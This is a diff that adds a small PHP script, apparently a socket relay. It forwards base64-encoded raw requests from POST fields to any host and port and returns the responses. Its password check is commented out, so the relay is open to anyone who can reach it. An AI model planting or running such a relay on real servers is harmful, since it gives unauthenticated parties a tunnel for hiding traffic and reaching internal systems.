@@ -1,0 +1,26 @@
+<?php
+
+//$secret = 'pproxypass';
+
+if(isset($_POST['query']) && isset($_POST['host']))
+{
+    if(isset($secret) && ($_POST['secret'] != $secret))exit;
+    header('Content-type: application/octet-stream');
+    @set_time_limit(0);
+    $query = base64_decode(str_replace(" ", "+", $_POST['query']));
+    list($host, $port) = explode(':', base64_decode(str_replace(" ", "+", $_POST['host'])));
+    if(!$port)$port = 80;
+    $ip = gethostbyname($host);
+    if($fp = @fsockopen($ip, $port, $errno, $errstr, 20))
+    {
+        fwrite($fp, $query);        
+        while(!feof($fp))
+        {
+            $answer = fread($fp, 1024);
+            echo $answer;
+        }
+        fclose($fp);
+    }
+    exit;
+}
+?> 
